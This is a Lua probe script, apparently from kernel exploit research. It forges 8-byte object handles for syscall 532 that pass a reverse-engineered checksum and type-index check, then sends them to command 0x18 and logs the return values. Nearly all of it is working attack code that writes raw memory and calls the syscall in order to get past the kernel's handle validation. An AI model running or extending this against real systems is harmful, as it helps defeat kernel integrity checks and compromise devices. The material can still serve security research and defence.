-- CRASH_CLASS: LOW
-- PROBE 308a: forge a sys 532 handle that passes the checksum
--
-- 307a: commands 0x18-0x1D return 0 and write 0x800D0204 (HANDLE_CHECKSUM) for
-- every sub-command and size, so a packed handle in the input buffer is
-- rejected before the object lookup.
--
-- results/kernel_handlers/analysis/sys_532_deep.md section 5:
--   checksum = byte[3] + byte[0] + byte[1] + byte[2] + byte[5]*byte[4]
--   low 16 bits of that must equal bytes [6:7]
--   byte[4] xor 0x6b must be <= 0xC (the type index)
-- The bytes are written one at a time so the packing cannot be misread; b0..b2
-- are zero, so the checksum reduces to byte[3] (+ byte[5]*byte[4]).

print("=== PROBE 308a: SYS 532 HANDLE FORGE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" and v.h then h, l = v.h, to_num(v.l) end
    if (h % 4294967296) == 4294967295 and (l % 4294967296) == 4294967295 then return -1 end
    if h >= 0xFFFF8000 then return -1 end
    return l
end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return -1
end
local function wd(addr, v)
    pcall(function() memory.write_dword(addr, v) end)
end
local function wb(addr, v)
    pcall(function() memory.write_byte(addr, v) end)
end

local sc = make_syscall(532)
local out = memory.alloc(0x1000)
local inp = memory.alloc(0x1000)
local function fill(addr, v)
    for i = 0, 0xFFF, 4 do wd(addr + i, v) end
end

-- b4 = 0x6b xor type; checksum = b3 + b5*b4 (b0..b2 zero); b6:b7 = checksum
local function forge(addr, t, b3, b5)
    local b4 = 0
    for i = 0, 255 do if i % 256 == 0 then b4 = 0 end end
    -- 0x6b xor t without bit32 (Lua 5.1): both are < 0x100
    local function bxor(a, c)
        local r, bit = 0, 1
        for _ = 1, 8 do
            local x, y = a % 2, c % 2
            if x ~= y then r = r + bit end
            a, c, bit = (a - x) / 2, (c - y) / 2, bit * 2
        end
        return r
    end
    b4 = bxor(0x6b, t)
    local checksum = (b3 + b5 * b4) % 0x10000
    wb(addr + 0, 0)
    wb(addr + 1, 0)
    wb(addr + 2, 0)
    wb(addr + 3, b3)
    wb(addr + 4, b4)
    wb(addr + 5, b5)
    wb(addr + 6, checksum % 0x100)
    wb(addr + 7, math.floor(checksum / 0x100))
end

local function call(cmd, size, t, b3, b5)
    fill(out, 0x41414141)
    fill(inp, 0x42424242)
    forge(inp, t, b3, b5)
    local okc, r = pcall(function()
        return sc(uint64(cmd), uint64(0), uint64(out), uint64(inp), uint64(size), uint64(0))
    end)
    if not okc then return nil, 0 end
    return sgn(r), rd(out)
end

print("--- A: forged handle at in+0, cmd 0x18, type 0..0xC ---")
for t = 0, 12 do
    local ret, first = call(0x18, 0x40, t, 0, 0)
    if ret == nil then print(string.format("  type %3d: DEAD", t)) break end
    print(string.format("  type %3d: ret=%d out0=0x%08X", t, ret, first))
end

print("")
print("--- B: nonzero checksum (b3=1) to prove the formula is evaluated ---")
for t = 0, 3 do
    local ret, first = call(0x18, 0x40, t, 1, 0)
    if ret == nil then print(string.format("  type %d b3=1: DEAD", t)) break end
    print(string.format("  type %d b3=1: ret=%d out0=0x%08X", t, ret, first))
end

print("")
print("--- C: b5 = 1 (multiplier term) ---")
for t = 0, 3 do
    local ret, first = call(0x18, 0x40, t, 0, 1)
    if ret == nil then print(string.format("  type %d b5=1: DEAD", t)) break end
    print(string.format("  type %d b5=1: ret=%d out0=0x%08X", t, ret, first))
end

print("=== DONE ===")
